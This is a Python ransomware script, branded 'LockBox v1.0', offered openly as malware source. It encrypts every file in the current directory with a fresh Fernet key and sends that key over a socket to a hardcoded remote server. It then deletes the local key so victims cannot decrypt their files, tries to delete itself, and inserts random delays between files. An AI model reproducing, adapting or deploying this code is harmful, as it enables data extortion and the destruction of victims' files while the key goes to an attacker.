import os
import random
import time
from datetime import datetime
import socket
from cryptography.fernet import Fernet

# Server configuration
SERVER_HOST = '192.168.172.96'  # Replace with server's IP address
SERVER_PORT = 8888  # Replace with server's port number

# ANSI escape sequences for colors
class colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    END = '\033[0m'

# Function to print colored messages
def print_colored(msg, color):
    print(f"{color}{msg}{colors.END}")

# Function to print the banner with colored text
def print_banner():
    banner = """
██████╗ ███████╗███╗   ██╗███████╗███╗   ███╗ █████╗ ███╗   ██╗
██╔══██╗██╔════╝████╗  ██║██╔════╝████╗ ████║██╔══██╗████╗  ██║
██║  ██║█████╗  ██╔██╗ ██║█████╗  ██╔████╔██║███████║██╔██╗ ██║
██║  ██║██╔══╝  ██║╚██╗██║██╔══╝  ██║╚██╔╝██║██╔══██║██║╚██╗██║
██████╔╝███████╗██║ ╚████║███████╗██║ ╚═╝ ██║██║  ██║██║ ╚████║
╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝
                                                                   
             LockBox v1.0
       ========================
         Author: Sagar Sehrawat
    """
    # Print banner with blue color
    print_colored(banner, colors.BLUE)

# Function to generate a Fernet key and save it to a key file
def generate_key_file(filename):
    key = Fernet.generate_key()
    with open(filename, 'wb') as key_file:
        key_file.write(key)
    return key

# Function to encrypt files in the current directory (excluding specific files)
def encrypt_files():
    files = []

    file_name = "encrypt.py"

    # List files in the current directory excluding specific files
    for i in os.listdir():
        if i == file_name or i == "listener.py" or i == "decrypt.py" or i == "sample_decrypt.py" or i=="malware.py" or i=="client_key.key" or i=="server_key.key":
            continue
        if os.path.isfile(i):
            files.append(i)

    print_colored("[+] Encrypting files...", colors.BLUE)

    # Introducing a 2-second delay before starting encryption
    time.sleep(2)

    key = Fernet.generate_key()

    with open("client_key.key", "wb") as the_key:
        the_key.write(key)

    start_time = datetime.now()

    # Encrypt each file with a random delay between 1 to 10 seconds
    for file in files:
        with open(file, "rb") as f:
            content = f.read()

        encrypted_content = Fernet(key).encrypt(content)

        with open(file, "wb") as f:
            f.write(encrypted_content)

        # Add a random delay between 1 to 10 seconds after encrypting each file
        delay = random.randint(1, 10)
        # print_colored(f"[+] Encrypting {file}... (waiting {delay} seconds)", colors.GREEN)
        time.sleep(delay)

    end_time = datetime.now()
    print_colored("[+] Encryption process complete.", colors.GREEN)

    return key

# Function to send key and encrypted file to the server
def send_key_and_file(filename, key_filename, key):
    try:
        # Connect to server
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((SERVER_HOST, SERVER_PORT))
        
        # Send the key file to the server
        with open(key_filename, 'rb') as key_file:
            key_data = key_file.read()
            client_socket.send(key_data)
        
        # Send the file contents
        cipher_suite = Fernet(key)
        with open(filename, 'rb') as file_to_send:
            file_data = file_to_send.read()
            encrypted_data = cipher_suite.encrypt(file_data)
            client_socket.send(encrypted_data)
        
        print(f"[FILE SENT] File '{filename}' sent successfully.")
        client_socket.close()
        
        # Remove the key file after sending
        os.remove(key_filename)
        print(f"[KEY FILE REMOVED] Key file '{key_filename}' removed.")
        
    except Exception as e:
        print(f"[ERROR] Failed to send file: {e}")

if __name__ == "__main__":
    print_banner()
    time.sleep(random.randint(0, 3))  # Random delay between 0 to 3 seconds
    
    # Call function to encrypt files and get the encryption key
    encryption_key = encrypt_files()
    
    # Call function to send key and file to the server
    file_to_send = "client_key.key"  # Replace with the file path you want to send
    key_filename = "client_key.key"  # Replace with the key file name
    send_key_and_file(file_to_send, key_filename, encryption_key)
    # Self-delete the script
    script_name = "malware.py"
    try:
        os.remove(script_name)
        print(f"[SELF-DESTRUCT] Script '{script_name}' has been removed.")
    except Exception as e:
        print(f"[ERROR] Failed to remove script: {e}")
